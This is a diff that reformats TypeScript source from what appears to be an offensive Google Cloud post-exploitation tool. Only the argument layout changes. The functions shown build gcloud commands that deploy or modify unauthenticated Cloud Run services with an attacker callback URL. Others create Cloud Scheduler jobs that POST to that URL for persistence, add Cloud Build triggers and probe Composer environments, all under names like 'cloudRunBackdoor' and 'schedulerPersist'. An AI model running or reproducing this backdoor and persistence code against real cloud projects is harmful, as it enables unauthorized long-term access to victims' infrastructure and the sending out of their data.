@@ -67,10 +67,20 @@ export async function cloudRunBackdoor(args: string[], timeout: number): Promise
   if (method === "create") {
     const deploy = await gcloud(
       [
-        "run", "deploy", `cs-${service}`, "--image", image,
-        "--set-env-vars", `CALLBACK_URL=${callbackUrl}`,
-        "--allow-unauthenticated", "--region", region,
-        "--project", project, "--quiet", "--format=json",
+        "run",
+        "deploy",
+        `cs-${service}`,
+        "--image",
+        image,
+        "--set-env-vars",
+        `CALLBACK_URL=${callbackUrl}`,
+        "--allow-unauthenticated",
+        "--region",
+        region,
+        "--project",
+        project,
+        "--quiet",
+        "--format=json",
       ],
       timeout,
     )
@@ -99,9 +109,17 @@ export async function cloudRunBackdoor(args: string[], timeout: number): Promise
   if (method === "inject") {
     const update = await gcloud(
       [
-        "run", "services", "update", service,
-        "--set-env-vars", `CALLBACK_URL=${callbackUrl}`,
-        "--region", region, "--project", project, "--quiet",
+        "run",
+        "services",
+        "update",
+        service,
+        "--set-env-vars",
+        `CALLBACK_URL=${callbackUrl}`,
+        "--region",
+        region,
+        "--project",
+        project,
+        "--quiet",
       ],
       timeout,
     )
@@ -139,19 +157,31 @@ export async function schedulerPersist(args: string[], timeout: number): Promise
 
   const output: string[] = [`[*] Cloud Scheduler persistence — project: ${project}\n`]
 
-  const existing = await gcloud(["scheduler", "jobs", "list", "--project", project, "--location", region, "--format=json"], timeout)
+  const existing = await gcloud(
+    ["scheduler", "jobs", "list", "--project", project, "--location", region, "--format=json"],
+    timeout,
+  )
   if (existing.exitCode === 0) {
     const jobs = tryJson(existing.stdout) || []
     output.push(`[*] Existing scheduler jobs: ${jobs.length}`)
   }
 
   const jobArgs = [
-    "scheduler", "jobs", "create", "http", `cs-${name}`,
-    "--schedule", schedule,
-    "--uri", callbackUrl,
-    "--http-method", "POST",
-    "--location", region,
-    "--project", project,
+    "scheduler",
+    "jobs",
+    "create",
+    "http",
+    `cs-${name}`,
+    "--schedule",
+    schedule,
+    "--uri",
+    callbackUrl,
+    "--http-method",
+    "POST",
+    "--location",
+    region,
+    "--project",
+    project,
     "--quiet",
   ]
 
@@ -221,12 +251,20 @@ export async function cloudBuildBackdoor(args: string[], timeout: number): Promi
 
   const create = await gcloud(
     [
-      "builds", "triggers", "create", "cloud-source-repositories",
-      "--name", `cs-build-${Date.now()}`,
-      "--repo", repo,
-      "--branch-pattern", `^${branch}$`,
-      "--build-config", configFile,
-      "--project", project,
+      "builds",
+      "triggers",
+      "create",
+      "cloud-source-repositories",
+      "--name",
+      `cs-build-${Date.now()}`,
+      "--repo",
+      repo,
+      "--branch-pattern",
+      `^${branch}$`,
+      "--build-config",
+      configFile,
+      "--project",
+      project,
       "--quiet",
     ],
     timeout,
@@ -285,7 +323,17 @@ export async function composerBackdoor(args: string[], timeout: number): Promise
   }
 
   const describe = await gcloud(
-    ["composer", "environments", "describe", environment, "--location", location, "--project", project, "--format=json"],
+    [
+      "composer",
+      "environments",
+      "describe",
+      environment,
+      "--location",
+      location,
+      "--project",
+      project,
+      "--format=json",
+    ],
     timeout,
   )
   if (describe.exitCode !== 0) {
